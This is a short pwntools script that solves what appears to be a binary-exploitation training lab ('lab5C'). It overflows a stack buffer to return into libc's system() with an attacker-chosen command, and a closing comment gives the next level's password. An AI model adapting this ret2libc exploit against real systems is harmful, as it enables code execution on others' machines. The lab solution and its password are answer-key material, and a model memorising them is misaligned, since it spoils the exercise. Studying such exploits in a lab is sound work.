from pwn import *

# aslr is disabled...
libc_base = 0xf7d7f000

p = process('./lab5C')
elf = ELF('./lab5C')
libc = ELF("/usr/lib/i386-linux-gnu/libc.so.6")

def exploit(cmd):
    if len(cmd) > 127:
        raise RuntimeError("exploit payload is too big")

    cmd = cmd.encode('utf-8') + b"\x00"

    system_addr = libc_base + elf.libc.sym['system']
    exit_addr = libc_base + elf.libc.sym['exit']
    cmd_addr = elf.sym['global_str']

    # input is being read by fgets(), which means it will keep reading until \n.
    # Therefore, we can put null terminator in our input.
    payload =  cmd + b"A" * (152 - len(cmd))
    payload += b"BBBB" # saved EBP
    payload += p32(system_addr)
    payload += p32(exit_addr) # return address for system()
    payload += p32(cmd_addr)
    payload += p32(6)

    p.clean()
    p.sendline(payload)

    p.wait_for_close()
    if p.poll() == 6:
        log.info('Exploit success!')

    return p.clean().strip().decode('utf-8')

print(exploit("date"))
# next password: s0m3tim3s_r3t2libC_1s_3n0ugh